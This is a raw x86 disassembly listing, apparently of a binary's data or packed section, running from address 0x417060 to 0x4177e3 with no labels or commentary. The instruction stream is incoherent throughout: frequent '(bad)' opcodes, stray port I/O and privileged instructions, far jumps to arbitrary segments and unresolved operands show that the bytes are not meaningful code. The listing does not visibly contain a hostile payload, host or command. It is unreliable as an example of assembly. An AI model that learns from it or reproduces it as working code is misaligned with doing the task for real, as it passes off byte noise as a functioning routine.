  417060:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417061:	mov    al,ds:0xa0009071
  417066:	sub    eax,0x6a16ae63
  41706b:	push   edi
  41706c:	daa    
  41706d:	inc    ebx
  41706e:	mov    al,0x44
  417070:	add    eax,0xa6b52187
  417075:	adc    dh,BYTE PTR [ecx]
  417077:	sbb    al,0xf4
  417079:	xchg   cl,dh
  41707b:	fmul   DWORD PTR [ecx]
  41707d:	cmp    dh,dl
  41707f:	inc    edi
  417080:	ss (bad) 
  417083:	pop    edx
  417084:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417085:	in     eax,dx
  417086:	xchg   edx,eax
  417087:	dec    esi
  417088:	or     al,0x51
  41708a:	cli    
  41708b:	and    ah,BYTE PTR [ebp+esi*2+0x50026198]
  417092:	inc    edi
  417093:	out    dx,al
  417094:	fbld   TBYTE PTR ds:0x422e329e
  41709a:	inc    eax
  41709b:	mov    edx,0x83e22182
  4170a0:	xchg   edx,eax
  4170a1:	xchg   DWORD PTR [esi],edi
  4170a3:	mov    esi,DWORD PTR [ebp-0x53]
  4170a6:	sbb    BYTE PTR [edx+ebx*8+0x50201b5],0x4
  4170ae:	out    0xa7,al
  4170b0:	ret    
  4170b1:	inc    ecx
  4170b2:	and    al,0x77
  4170b4:	inc    esp
  4170b5:	add    BYTE PTR [edi],ah
  4170b7:	push   0x623c3870
  4170bc:	out    0xe7,al
  4170be:	enter  0xb406,0x4a
  4170c2:	test   al,0x5e
  4170c4:	push   ebp
  4170c5:	pop    edx
  4170c6:	stos   BYTE PTR es:[edi],al
  4170c7:	das    
  4170c8:	adc    eax,0x1ee99085
  4170cd:	adc    BYTE PTR [edx-0x5965f6c2],ch
  4170d3:	jnp    0x41708a
  4170d5:	je     0x4170bf
  4170d7:	sbb    al,0xe
  4170d9:	cwde   
  4170da:	pusha  
  4170db:	imul   edx,DWORD PTR [eax-0x56],0x51
  4170df:	(bad)  
  4170e0:	push   ebx
  4170e1:	popa   
  4170e2:	fwait
  4170e3:	or     DWORD PTR [ecx],ecx
  4170e5:	loopne 0x417130
  4170e7:	and    ah,BYTE PTR [esi-0x2d16f85d]
  4170ed:	cmp    eax,0x5a552eec
  4170f2:	pop    edi
  4170f3:	mov    dh,dh
  4170f5:	jne    0x417124
  4170f7:	(bad)  
  4170f8:	pop    edi
  4170f9:	cmp    BYTE PTR [ecx],dh
  4170fb:	gs fsubr st,st(5)
  4170fe:	mov    ah,0x38
  417100:	jne    0x417149
  417102:	mov    eax,ds:0xeb98808e
  417107:	shl    DWORD PTR [esi+0x4bd69e15],0xec
  41710e:	ins    BYTE PTR es:[edi],dx
  41710f:	inc    eax
  417110:	out    dx,al
  417111:	neg    BYTE PTR [ecx-0x33]
  417114:	cmp    eax,0x54bb906e
  417119:	xchg   ecx,eax
  41711a:	fwait
  41711b:	out    dx,eax
  41711c:	addr16 hlt 
  41711e:	jmp    0xa70cc54d
  417123:	add    dh,dl
  417125:	shl    BYTE PTR [eax+ebp*2+0x36280c65],cl
  41712c:	add    ah,BYTE PTR [edx+0x1c]
  41712f:	sbb    BYTE PTR [eax-0x2eae23f4],0x3
  417136:	jl     0x4171b1
  417138:	outs   dx,DWORD PTR ds:[esi]
  417139:	pop    eax
  41713a:	sti    
  41713b:	cmp    DWORD PTR [esi+0x9def133],esp
  417141:	push   0xfffffff5
  417143:	in     al,0xc0
  417145:	sbb    al,0x84
  417147:	sbb    al,0x9a
  417149:	and    bl,BYTE PTR [eax+0x47]
  41714c:	(bad)  
  41714d:	in     eax,0x2c
  41714f:	inc    ebx
  417150:	test   eax,0x8988530c
  417155:	bnd jne 0x41715d
  417158:	loope  0x41713e
  41715a:	pop    edx
  41715b:	cmp    eax,0x1c7e44e5
  417160:	sub    BYTE PTR [edx-0x38],0xc6
  417164:	push   esp
  417165:	adc    eax,DWORD PTR [eax+ebx*1+0x5d]
  417169:	loop   0x41719e
  41716b:	fdivr  st(5),st
  41716d:	mov    eax,ds:0x7fe51846
  417172:	jns    0x417111
  417174:	mov    DWORD PTR [ebx-0x43],ebp
  417177:	xchg   BYTE PTR [edx],bh
  417179:	inc    ebp
  41717a:	jo     0x4171eb
  41717c:	outs   dx,DWORD PTR ds:[esi]
  41717d:	inc    ebx
  41717e:	dec    edx
  41717f:	cmp    bh,dh
  417181:	mov    ds:0x44bc1f36,eax
  417186:	jo     0x4171f4
  417188:	rol    BYTE PTR [ebx+0x3ca0bc10],1
  41718e:	xor    al,0x2d
  417190:	ret    
  417191:	fstp   DWORD PTR [ebx-0x65]
  417195:	ins    BYTE PTR es:[edi],dx
  417196:	jp     0x4171f5
  417198:	or     ecx,DWORD PTR [ebp+0x58b97e5f]
  41719e:	call   0x95183cf1
  4171a3:	mov    WORD PTR [ebp-0x33],?
  4171a6:	pop    esp
  4171a7:	pop    ds
  4171a8:	aas    
  4171a9:	fnsave [ebx+0x63]
  4171ac:	sbb    DWORD PTR [esi],ebx
  4171ae:	xor    eax,0x7903db12
  4171b3:	sbb    eax,0x8cb5b23a
  4171b8:	out    dx,al
  4171b9:	scas   eax,DWORD PTR es:[edi]
  4171ba:	mov    dl,0xf0
  4171bc:	xchg   ebx,eax
  4171bd:	cmp    al,0xb3
  4171bf:	push   cs
  4171c0:	add    esp,ebx
  4171c2:	mov    eax,ds:0xdf957e8
  4171c7:	repz inc esp
  4171c9:	mov    esp,0x7da6505f
  4171ce:	and    al,0x66
  4171d0:	xchg   edi,eax
  4171d1:	iret   
  4171d2:	(bad)  
  4171d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4171d4:	in     eax,0xf5
  4171d6:	adc    bl,BYTE PTR [edx]
  4171d8:	shl    DWORD PTR [ecx+0x51456afc],1
  4171de:	out    dx,al
  4171df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4171e0:	mov    esp,DWORD PTR ds:0x2e223577
  4171e6:	sub    ebx,ecx
  4171e8:	cmp    edi,DWORD PTR [esi-0xb0cad33]
  4171ee:	sbb    eax,0x8ecc2d01
  4171f3:	xor    eax,ebx
  4171f5:	jnp    0x4171b3
  4171f7:	pop    esp
  4171f8:	and    dh,BYTE PTR [eax]
  4171fa:	scas   eax,DWORD PTR es:[edi]
  4171fb:	push   cs
  4171fc:	test   DWORD PTR [ebx],esi
  4171fe:	aam    0x74
  417200:	mov    ?,WORD PTR [ecx]
  417202:	inc    esi
  417203:	mov    edi,0xc19cb1c
  417208:	shl    BYTE PTR [ecx],1
  41720a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41720b:	sbb    al,BYTE PTR [esi-0x779817ab]
  417211:	mov    DWORD PTR ds:0xb3660a4d,0x8ecfe7ea
  41721b:	pop    esi
  41721c:	out    dx,al
  41721d:	call   0xff27:0x922e28bd
  417224:	jge    0x4171af
  417226:	enter  0x2e49,0xf8
  41722a:	mov    esi,0x6f4f8e1d
  41722f:	mov    WORD PTR [eax],ss
  417231:	mov    DWORD PTR [edx-0x8],edi
  417234:	cwde   
  417235:	add    BYTE PTR [ebp-0x7d96b344],bl
  41723b:	pop    ebx
  41723c:	mov    ecx,0x1c03434a
  417241:	sbb    cl,BYTE PTR [ebx-0x17]
  417244:	fild   WORD PTR [edx]
  417246:	add    BYTE PTR [eax],al
  417248:	fsubrp st(0),st
  41724a:	(bad)  
  41724b:	stos   BYTE PTR es:[edi],al
  41724c:	mov    gs,WORD PTR [edx-0x16]
  41724f:	ins    BYTE PTR es:[edi],dx
  417250:	leave  
  417251:	pop    ebx
  417252:	sub    al,0x41
  417254:	sub    BYTE PTR [ebp+0x267037a2],ch
  41725a:	jg     0x4172cc
  41725c:	mov    ecx,0x1370707e
  417261:	mov    bh,0xc1
  417263:	shr    BYTE PTR [ebx+edx*1],cl
  417266:	and    DWORD PTR [ecx+0x77],ebp
  417269:	call   0x8e70:0x35db06f4
  417270:	ins    DWORD PTR es:[edi],dx
  417271:	push   esi
  417272:	gs jg  0x417251
  417275:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417276:	sbb    eax,0xebe97803
  41727b:	adc    al,0x3e
  41727d:	pop    ecx
  41727e:	pop    eax
  41727f:	or     bh,dh
  417281:	inc    edi
  417282:	mov    bh,0xf8
  417284:	pop    ecx
  417285:	mov    ds:0x4ce8fd5a,al
  41728a:	and    bl,cl
  41728c:	aad    0xb7
  41728e:	push   0x51
  417290:	pop    esp
  417291:	fwait
  417292:	cli    
  417293:	sbb    ch,BYTE PTR [ebx]
  417295:	not    DWORD PTR [ebx+0x22abd1a3]
  41729b:	dec    edx
  41729c:	mov    ah,0x1e
  41729e:	fs xor al,0x7d
  4172a1:	adc    DWORD PTR [ebx+0x6ce47439],edx
  4172a7:	out    0xa4,eax
  4172a9:	jb     0x41726d
  4172ab:	jns    0x4172f6
  4172ad:	mov    al,ds:0x32ec8395
  4172b2:	out    dx,al
  4172b3:	mov    ah,0xb
  4172b5:	popa   
  4172b6:	sub    ebx,DWORD PTR [esi]
  4172b8:	sub    ah,dh
  4172ba:	push   ds
  4172bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4172bc:	xor    eax,0xd0687bd0
  4172c1:	std    
  4172c2:	or     eax,0x120c6322
  4172c7:	adc    al,0x98
  4172c9:	retf   0x990c
  4172cc:	test   BYTE PTR [eax-0x5f],ah
  4172cf:	mov    al,ds:0xe56dc89c
  4172d4:	xchg   ebp,eax
  4172d5:	mov    bl,0xc
  4172d7:	addr16 popa 
  4172d9:	xlat   BYTE PTR ds:[ebx]
  4172da:	fcmovnu st,st(3)
  4172dc:	int    0x74
  4172de:	pop    ebp
  4172df:	sbb    DWORD PTR [edx+eiz*8-0x6e64a9a2],ebp
  4172e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4172e7:	mov    al,0xe8
  4172e9:	fcmove st,st(2)
  4172eb:	retf   0xac05
  4172ee:	add    DWORD PTR [edi-0x12],ebx
  4172f1:	and    al,0x1
  4172f3:	popa   
  4172f4:	loope  0x41731a
  4172f6:	pusha  
  4172f7:	and    bl,ah
  4172f9:	jmp    0x417348
  4172fb:	ss inc ebp
  4172fd:	ds push esp
  4172ff:	xor    al,0x8c
  417301:	outs   dx,DWORD PTR ds:[esi]
  417302:	and    al,0x52
  417304:	push   es
  417305:	push   edx
  417306:	jnp    0x4172e1
  417308:	lods   eax,DWORD PTR ds:[esi]
  417309:	jmp    0x8912:0xbad78734
  417310:	mov    es,WORD PTR [ecx-0x59]
  417313:	or     cl,ch
  417315:	ins    DWORD PTR es:[edi],dx
  417316:	ss push ss
  417318:	jge    0x417383
  41731a:	sub    eax,0x5366fd2b
  41731f:	and    eax,0xe43ccec3
  417324:	test   al,0x4d
  417326:	stos   BYTE PTR es:[edi],al
  417327:	aam    0xc6
  417329:	rol    DWORD PTR [ebx-0x6a2c7ca5],1
  41732f:	jl     0x417309
  417331:	stc    
  417332:	pop    ss
  417333:	sti    
  417334:	push   es
  417335:	idiv   ch
  417337:	stos   BYTE PTR es:[edi],al
  417338:	xor    al,0xbc
  41733a:	adc    dl,ah
  41733c:	sub    bh,al
  41733e:	inc    esi
  41733f:	nop
  417340:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417341:	add    DWORD PTR [edi-0x17c7d1f7],edx
  417347:	push   eax
  417348:	inc    esp
  417349:	mov    WORD PTR [edx+0x5],?
  41734c:	loop   0x41733f
  41734e:	ja     0x41739a
  417350:	mov    esi,DWORD PTR [eax-0xe]
  417353:	das    
  417354:	scas   eax,DWORD PTR es:[edi]
  417355:	das    
  417356:	(bad)  
  417357:	scas   eax,DWORD PTR es:[edi]
  417358:	cs cld 
  41735a:	cmp    dh,dh
  41735c:	jb     0x417316
  41735e:	add    esi,0xfffffffd
  417361:	jp     0x4172e3
  417363:	loope  0x4173a1
  417365:	push   edx
  417366:	add    DWORD PTR [esi+eiz*1-0x456fc6e5],edx
  41736d:	cld    
  41736e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41736f:	les    ebp,FWORD PTR [edx]
  417371:	jbe    0x4173a4
  417373:	jns    0x41732d
  417375:	mov    WORD PTR [eax],cs
  417377:	dec    esi
  417378:	loopne 0x417330
  41737a:	mov    dh,0xff
  41737c:	scas   eax,DWORD PTR es:[edi]
  41737d:	sub    eax,0xba6ece64
  417382:	imul   DWORD PTR [eax-0x6fbe0b79]
  417388:	loope  0x41731a
  41738a:	add    BYTE PTR [eax+eax*8+0x48ccf1fd],bl
  417391:	pop    ecx
  417392:	sbb    eax,0x139a5ade
  417397:	je     0x417320
  417399:	mov    al,ds:0xd47e21a1
  41739e:	and    eax,0x3fac769c
  4173a3:	xor    al,0x50
  4173a5:	inc    ebp
  4173a6:	cli    
  4173a7:	xor    dl,ah
  4173a9:	sti    
  4173aa:	dec    eax
  4173ab:	add    esi,ebx
  4173ad:	popw   es
  4173af:	mov    dh,BYTE PTR [ebx-0x1b22c96f]
  4173b5:	dec    edx
  4173b6:	leave  
  4173b7:	jne    0x4173f2
  4173b9:	mov    eax,0xb6cd51e0
  4173be:	lock into 
  4173c0:	test   DWORD PTR [edx],edi
  4173c2:	enter  0xdd1c,0x72
  4173c6:	fisub  DWORD PTR [eax+0xd]
  4173c9:	and    BYTE PTR [eax+0x1a],dh
  4173cc:	iret   
  4173cd:	or     bh,BYTE PTR [edx+0x28df67cb]
  4173d3:	arpl   cx,bp
  4173d5:	jno    0x4173ad
  4173d7:	xchg   ebp,eax
  4173d8:	ret    
  4173d9:	mov    edi,DWORD PTR [edi]
  4173db:	loop   0x41743d
  4173dd:	mov    esi,0x5fb89c77
  4173e2:	inc    esp
  4173e3:	pop    eax
  4173e4:	xchg   edi,eax
  4173e5:	mov    ebp,0x64b1f44d
  4173ea:	dec    esi
  4173eb:	and    DWORD PTR [edx+0x1a7ebd2b],0x35
  4173f2:	pop    es
  4173f3:	ds in  eax,dx
  4173f5:	pop    es
  4173f6:	jno    0x4173c3
  4173f8:	jae    0x417400
  4173fa:	out    0xf5,al
  4173fc:	mov    esi,ebp
  4173fe:	(bad)  
  4173ff:	je     0x417451
  417401:	out    0xe1,eax
  417403:	inc    ebp
  417404:	add    edi,DWORD PTR [ecx]
  417406:	and    eax,0xfc938c6
  41740b:	pop    esp
  41740c:	add    eax,0x93e6f39f
  417411:	jmp    0x4173e8
  417413:	jg     0x417414
  417415:	and    DWORD PTR [edi],ebx
  417417:	add    eax,0x9fb4a739
  41741c:	imul   esi,ebx,0xffffffbb
  41741f:	mov    al,0x91
  417421:	push   edx
  417422:	dec    edi
  417423:	fstp   DWORD PTR [esp+ebp*1-0x3423ada]
  41742a:	or     BYTE PTR [esi+eiz*4+0x6b],bl
  41742e:	cmp    al,0x87
  417430:	lahf   
  417431:	call   DWORD PTR [edi-0x56]
  417434:	xor    dl,BYTE PTR [edi]
  417436:	push   ebx
  417437:	adc    DWORD PTR [ecx+0x6e],ebp
  41743a:	loope  0x417488
  41743c:	lds    eax,FWORD PTR [edx+0x778e82b8]
  417442:	xchg   edx,eax
  417443:	(bad)
  417448:	add    DWORD PTR [ebx],ebx
  41744a:	push   edi
  41744b:	xlat   BYTE PTR ds:[ebx]
  41744c:	sbb    DWORD PTR es:[eax+0x5da5a975],ebp
  417453:	out    dx,al
  417454:	xor    eax,0xaddd416d
  417459:	mov    edi,0x36ba0c02
  41745e:	mov    ds:0x497de98d,al
  417463:	das    
  417464:	jl     0x4174e4
  417466:	es ins BYTE PTR es:[edi],dx
  417468:	sahf   
  417469:	mov    bh,0xb4
  41746b:	aas    
  41746c:	gs int3 
  41746e:	jg     0x41744e
  417470:	std    
  417471:	jg     0x417421
  417473:	aad    0xaa
  417475:	inc    ebx
  417476:	xchg   ecx,eax
  417477:	lds    esp,FWORD PTR [edi+0x18]
  41747a:	cmp    al,0x55
  41747c:	mov    al,0xc1
  41747e:	sti    
  41747f:	add    al,0xa5
  417481:	and    al,al
  417483:	cld    
  417484:	push   eax
  417485:	dec    edx
  417486:	(bad)  
  417487:	test   al,0xce
  417489:	xchg   esi,eax
  41748a:	jns    0x41743f
  41748c:	add    BYTE PTR [ebp+0x17],bl
  41748f:	mov    cl,0xb3
  417491:	fucomp st(7)
  417493:	inc    ebx
  417494:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417495:	or     dl,BYTE PTR [edi]
  417497:	out    dx,al
  417498:	adc    ah,ah
  41749a:	add    edi,DWORD PTR [edx-0xabb79e7]
  4174a0:	pop    ds
  4174a1:	mov    eax,ds:0xb10616f9
  4174a6:	and    eax,0x8106ac41
  4174ab:	in     eax,0xfc
  4174ad:	pusha  
  4174ae:	pushf  
  4174af:	mov    cl,BYTE PTR [eax+0x13689c22]
  4174b5:	mov    bh,0x6b
  4174b7:	xlat   BYTE PTR ds:[ebx]
  4174b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4174b9:	popf   
  4174ba:	ret    
  4174bb:	hlt    
  4174bc:	push   eax
  4174bd:	xor    esp,esp
  4174bf:	push   cs
  4174c0:	shl    BYTE PTR [eax+0x45c5beff],1
  4174c6:	shr    BYTE PTR [edx+0x17],cl
  4174c9:	add    DWORD PTR [ebx+0x2b],0x4d
  4174cd:	test   DWORD PTR [ecx+0x47],esi
  4174d0:	sti    
  4174d1:	je     0x4174fc
  4174d3:	mov    dh,0x64
  4174d5:	add    eax,0x6d6fff02
  4174da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4174db:	or     ah,BYTE PTR [ecx-0x3f]
  4174de:	out    dx,al
  4174df:	jg     0x417500
  4174e1:	aas    
  4174e2:	mov    BYTE PTR [esi],ah
  4174e4:	cwde   
  4174e5:	pop    esp
  4174e6:	setno  BYTE PTR [ebx-0x1601318b]
  4174ed:	sbb    ah,BYTE PTR [ebp-0x3a]
  4174f0:	(bad)  
  4174f1:	jmp    0xea6207f7
  4174f6:	add    al,0xac
  4174f8:	add    ecx,DWORD PTR [ebp-0x1]
  4174fb:	cwde   
  4174fc:	dec    esi
  4174fd:	push   cs
  4174fe:	mov    eax,ds:0x292bfc04
  417503:	pop    ss
  417504:	or     DWORD PTR [edx+0x3770fd25],esi
  41750a:	lock jbe 0x4174d9
  41750d:	cdq    
  41750e:	push   edx
  41750f:	jnp    0x4174f8
  417511:	dec    edi
  417512:	pop    esi
  417513:	fsub   QWORD PTR [esi]
  417515:	xchg   DWORD PTR [edx],esi
  417517:	das    
  417518:	pop    ds
  417519:	outs   dx,DWORD PTR ds:[esi]
  41751a:	mov    ch,0xaf
  41751c:	lahf   
  41751d:	mov    ds:0x6c65a2e6,eax
  417522:	xchg   ebp,eax
  417523:	pushw  es
  417525:	push   edi
  417526:	pop    edx
  417527:	xor    edx,edx
  417529:	add    DWORD PTR [ebp-0xc],ebx
  41752c:	pop    ebx
  41752d:	mov    eax,DWORD PTR [ebp-0xc]
  417530:	pop    edi
  417531:	jmp    0x417815
  417536:	cld    
  417537:	pop    esi
  417538:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417539:	addr16 popa 
  41753b:	gs mov esp,0x68365a61
  417541:	mov    DWORD PTR [edx-0x4656e567],ebx
  417547:	and    al,0x7f
  417549:	jo     0x417504
  41754b:	jle    0x4175bd
  41754d:	jo     0x417560
  41754f:	fdivr  QWORD PTR [edi+0x3db5cc81]
  417555:	ins    BYTE PTR es:[edi],dx
  417556:	fiadd  WORD PTR [ecx+0x55]
  417559:	xchg   BYTE PTR [edi+0x60],dh
  41755c:	jl     0x417589
  41755e:	xchg   esp,eax
  41755f:	sbb    al,BYTE PTR [ebp+0x7465bc35]
  417565:	hlt    
  417566:	mov    edx,0x24b92d5
  41756b:	pusha  
  41756c:	sub    DWORD PTR fs:[ebx-0x79],0xaa5b2557
  417574:	aam    0xbb
  417576:	push   eax
  417577:	and    eax,0x17de408b
  41757c:	not    DWORD PTR [ecx+0x1a]
  41757f:	pop    ss
  417580:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417581:	cmp    bl,cl
  417583:	pop    edx
  417584:	mov    bh,0x2d
  417586:	lock jnp 0xde4f58c4
  41758d:	add    ebx,DWORD PTR [edi]
  41758f:	lds    eax,FWORD PTR ds:0x163bec45
  417595:	push   cs
  417596:	call   edx
  417598:	ins    DWORD PTR es:[edi],dx
  417599:	bndstx [ecx-0x40e9957e],bnd1
  4175a0:	mov    ebp,0xba536717
  4175a5:	inc    BYTE PTR [edx]
  4175a7:	fidiv  WORD PTR [edx+ecx*2]
  4175aa:	jo     0x4175ab
  4175ac:	xor    al,0x45
  4175ae:	jp     0x41754b
  4175b0:	and    al,0xb2
  4175b2:	mov    ah,0x66
  4175b4:	lahf   
  4175b5:	jnp    0x4175af
  4175b7:	inc    ebx
  4175b8:	xchg   edi,eax
  4175b9:	dec    esi
  4175ba:	xchg   edi,eax
  4175bb:	mov    BYTE PTR [ebx-0x40],ah
  4175be:	sub    DWORD PTR [edi-0x12a80933],esp
  4175c4:	xor    DWORD PTR [ebx-0x481f9475],ebp
  4175ca:	(bad)  
  4175cc:	adc    dh,bl
  4175ce:	or     al,0xa5
  4175d0:	sbb    ah,BYTE PTR [esi]
  4175d2:	inc    ebp
  4175d3:	adc    esi,DWORD PTR ds:0xee6408a2
  4175d9:	dec    eax
  4175da:	jne    0x4175ad
  4175dc:	cli    
  4175dd:	push   ss
  4175de:	add    esi,eax
  4175e0:	sub    BYTE PTR cs:0xa54342bf,ch
  4175e7:	aad    0x45
  4175e9:	cs ins BYTE PTR es:[edi],dx
  4175eb:	es push ebp
  4175ed:	mov    al,0x71
  4175ef:	lods   eax,DWORD PTR ds:[esi]
  4175f0:	jecxz  0x417665
  4175f2:	inc    ebp
  4175f3:	cmp    BYTE PTR [eax],cl
  4175f5:	jg     0x4175e5
  4175f7:	sahf   
  4175f8:	dec    ecx
  4175f9:	out    dx,al
  4175fa:	pop    ecx
  4175fb:	(bad)  
  4175fc:	icebp  
  4175fd:	shl    ecx,1
  4175ff:	pop    es
  417600:	push   ebx
  417601:	inc    eax
  417602:	xchg   ecx,eax
  417603:	jp     0x41761b
  417605:	(bad)  
  417606:	cs pop eax
  417608:	push   esp
  417609:	cwde   
  41760a:	mov    edi,0x846e434f
  41760f:	push   edx
  417610:	rdpmc  
  417612:	xchg   ebx,eax
  417613:	sbb    ah,BYTE PTR [esi-0x641ba8b1]
  417619:	jge    0x41763e
  41761b:	cmp    eax,0x3ee87ed
  417620:	dec    esp
  417621:	add    al,dl
  417623:	sbb    eax,0xd173e56c
  417628:	mov    cl,0x9b
  41762a:	into   
  41762b:	pop    ds
  41762c:	push   0x7fb399f7
  417631:	mov    dh,0x7
  417633:	cdq    
  417634:	push   esi
  417635:	xchg   ebp,eax
  417636:	sub    esi,ebx
  417638:	stos   DWORD PTR es:[edi],eax
  417639:	xor    esi,DWORD PTR [edi+0x15]
  41763c:	loop   0x417683
  41763e:	aas    
  41763f:	jbe    0x4176ab
  417641:	pop    ebp
  417642:	loopne 0x417630
  417644:	fldenv [edi+0x1a]
  417647:	rcr    ebp,1
  417649:	inc    ebp
  41764a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41764b:	std    
  41764c:	push   ebx
  41764d:	int3   
  41764e:	jp     0x4175f1
  417650:	sub    eax,0x29b8a30c
  417655:	scas   eax,DWORD PTR es:[edi]
  417656:	cmp    eax,ebx
  417658:	mov    eax,0x7d90079e
  41765d:	push   ds
  41765e:	xchg   DWORD PTR [esi],ebp
  417660:	and    BYTE PTR [eax-0x76ba5153],ch
  417666:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417667:	sahf   
  417668:	stos   DWORD PTR es:[edi],eax
  417669:	pop    es
  41766a:	jge    0x4176d1
  41766c:	adc    DWORD PTR [eax+0x6e],0x23e931c0
  417673:	scas   al,BYTE PTR es:[edi]
  417674:	xor    DWORD PTR [ecx+ebx*2-0x2f],ebp
  417678:	aam    0x9
  41767a:	sub    ebx,DWORD PTR [edi-0x21]
  41767d:	cmp    al,0xe5
  41767f:	push   esi
  417680:	leave  
  417681:	das    
  417682:	add    eax,0xa7f77c04
  417687:	adc    BYTE PTR [ecx-0x34],bl
  41768a:	sub    ecx,DWORD PTR [ecx+0x6]
  41768d:	cli    
  41768e:	dec    ecx
  41768f:	retf   0x980d
  417692:	idiv   BYTE PTR [ebp+0x70]
  417695:	cmp    edx,ebx
  417697:	ret    0x887d
  41769a:	adc    al,0xd8
  41769c:	xor    eax,0x2c88da80
  4176a1:	sub    al,0xd3
  4176a3:	add    BYTE PTR [edx+0x1],ah
  4176a6:	ins    DWORD PTR es:[edi],dx
  4176a7:	aas    
  4176a8:	jns    0x417640
  4176aa:	or     ecx,ebp
  4176ac:	cmp    eax,0xd2e393e1
  4176b1:	setne  dl
  4176b4:	mov    dl,0xd5
  4176b6:	ficomp WORD PTR [ecx-0x1a54a527]
  4176bc:	mov    bh,0xe6
  4176be:	out    dx,eax
  4176bf:	inc    ebp
  4176c0:	in     al,0x3a
  4176c2:	cmp    edi,edi
  4176c4:	xchg   esp,eax
  4176c5:	call   0xffda3c78
  4176ca:	jg     0x417693
  4176cc:	sub    al,0xa2
  4176ce:	sar    ah,cl
  4176d0:	jo     0x4176d3
  4176d2:	ret    
  4176d3:	daa    
  4176d4:	in     al,0xb9
  4176d6:	outs   dx,BYTE PTR ds:[esi]
  4176d7:	lea    eax,ds:0xde48e6ca
  4176dd:	mov    cl,bl
  4176df:	shl    BYTE PTR [si+0x39],0x1e
  4176e4:	out    dx,eax
  4176e5:	inc    eax
  4176e6:	add    BYTE PTR [eax-0x17],bh
  4176e9:	push   edx
  4176ea:	popf   
  4176eb:	inc    ebp
  4176ec:	mov    edx,0xdd45222d
  4176f1:	icebp  
  4176f2:	jge    0x41776f
  4176f4:	sub    DWORD PTR [edi-0x69],eax
  4176f7:	sub    BYTE PTR [edi+0x4a],ch
  4176fa:	stos   DWORD PTR es:[edi],eax
  4176fb:	std    
  4176fc:	ins    DWORD PTR es:[edi],dx
  4176fd:	jecxz  0x41776b
  4176ff:	xor    ecx,ebp
  417701:	fwait
  417702:	in     eax,0x4a
  417704:	fsubr  QWORD PTR [ecx+0x41721d0c]
  41770a:	adc    ecx,ebx
  41770c:	sbb    BYTE PTR [edx-0x7d],al
  41770f:	xor    dl,BYTE PTR [esi-0x71]
  417712:	out    0x4c,eax
  417714:	mov    WORD PTR [eax],?
  417716:	adc    ecx,edx
  417718:	mov    ah,0x8d
  41771a:	inc    edi
  41771b:	jg     0x417760
  41771d:	out    0x4f,al
  41771f:	int3   
  417720:	inc    esi
  417721:	or     DWORD PTR [ebx],esp
  417723:	or     eax,0x32da51b5
  417728:	bound  eax,QWORD PTR [edi]
  41772a:	int    0xe3
  41772c:	mov    dl,0x12
  41772e:	pop    ecx
  41772f:	pmulhuw mm3,QWORD PTR [edx]
  417732:	mov    bh,0xb3
  417734:	aam    0x1b
  417736:	in     al,0xa7
  417738:	aas    
  417739:	sub    DWORD PTR [ebx-0x28a545db],esp
  41773f:	aaa    
  417740:	shl    DWORD PTR [eax+0x3bb8997f],cl
  417746:	mov    bl,0x75
  417748:	test   BYTE PTR [eax],bl
  41774a:	pop    esp
  41774b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41774c:	adc    edx,DWORD PTR [edx+0x69ec5ef6]
  417752:	pusha  
  417753:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417754:	lods   al,BYTE PTR ds:[esi]
  417755:	and    DWORD PTR [edi-0x4c],edi
  417758:	mov    eax,0x80b572a8
  41775d:	push   edx
  41775e:	mov    bl,BYTE PTR [ecx]
  417760:	or     al,0xbe
  417762:	add    bl,bl
  417764:	mov    al,0xff
  417766:	push   0x55dd257d
  41776b:	and    BYTE PTR [esi+0x35],al
  41776e:	sbb    DWORD PTR [esi],edx
  417770:	push   esp
  417771:	push   esp
  417772:	sub    DWORD PTR [ebx+0x6f73b42d],ebp
  417778:	scas   eax,DWORD PTR es:[edi]
  417779:	inc    esp
  41777a:	loope  0x417788
  41777c:	and    esi,DWORD PTR [eax+0x1689eb0]
  417782:	into   
  417783:	shl    DWORD PTR [edi+0x76e4fe11],0xcf
  41778a:	cmp    DWORD PTR [ebp-0x37],ebp
  41778d:	cmp    edi,DWORD PTR [esi+eiz*4]
  417790:	sbb    eax,0xc26f3cfc
  417795:	in     al,dx
  417796:	cmp    DWORD PTR [edi],0x3b188111
  41779c:	mov    ecx,0x6ed2c888
  4177a1:	sub    eax,0x78ec026e
  4177a6:	sub    ch,bl
  4177a8:	std    
  4177a9:	or     BYTE PTR [esi],bl
  4177ab:	arpl   WORD PTR [eax+ebx*1+0x7cd3fb03],sp
  4177b2:	test   al,0x72
  4177b4:	sbb    bl,cl
  4177b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4177b7:	or     bl,cl
  4177b9:	jb     0x41778c
  4177bb:	aaa    
  4177bc:	or     DWORD PTR [ecx+eiz*2],esp
  4177bf:	dec    edi
  4177c0:	mov    cl,0xf2
  4177c2:	jecxz  0x417840
  4177c4:	mov    edi,0x6c1cad64
  4177c9:	fdiv   DWORD PTR [ebx]
  4177cb:	fistp  DWORD PTR [ebp+esi*2-0x14]
  4177cf:	pop    ecx
  4177d0:	mov    cl,0x8c
  4177d2:	and    al,ah
  4177d4:	xchg   ebp,eax
  4177d5:	sbb    DWORD PTR [esi-0x33],eax
  4177d8:	xchg   ebx,eax
  4177d9:	jge    0x4177f8
  4177db:	mov    al,0xdd
  4177dd:	xchg   ebp,eax
  4177de:	jle    0x4177ae
  4177e0:	adc    dl,BYTE PTR [edx-0x69]
  4177e3:	dec    ebp
